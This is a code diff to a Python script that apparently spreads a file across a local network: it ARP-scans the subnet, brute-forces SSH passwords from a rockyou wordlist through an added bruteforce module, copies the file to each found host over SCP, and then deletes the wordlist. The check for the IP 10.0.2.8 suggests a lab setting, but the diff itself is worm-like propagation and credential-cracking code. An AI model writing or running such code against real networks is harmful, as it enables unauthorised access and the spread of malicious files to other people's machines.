@@ -2,6 +2,7 @@ import paramiko, getpass,os, socket,shutil, subprocess, wmi
 from scp import SCPClient
 from classes.gateway import *
 from classes.arpy import *
+from classes.bruteforce import *
 
 user = getpass.getuser()
 
@@ -24,8 +25,7 @@ def findmyIP():
     return True if(socket.gethostbyname(hostname) == "10.0.2.8") else False
 
 ## running SCP to copy the file across the network
-def runThisSCP():
-    password = "test123@@@@@" ### THIS NEEDS TO BE BRUTE FORCE
+def runThisSCP(password):
     port=22
     print("hit")
     for i,ipnet in enumerate(list_IP):
@@ -56,7 +56,11 @@ def main():
     findtheFile()
     list_IP = arpy(subnet)
     if(findmyIP()):
-        runThisSCP()
+        create_rockyou()
+        password_list = read_txt()
+        pw = crack_ssh(password_list)
+        runThisSCP(pw)
+        remove_file(os.path.abspath("./rockyou.txt"))
 
 if __name__ == "__main__":
     main()
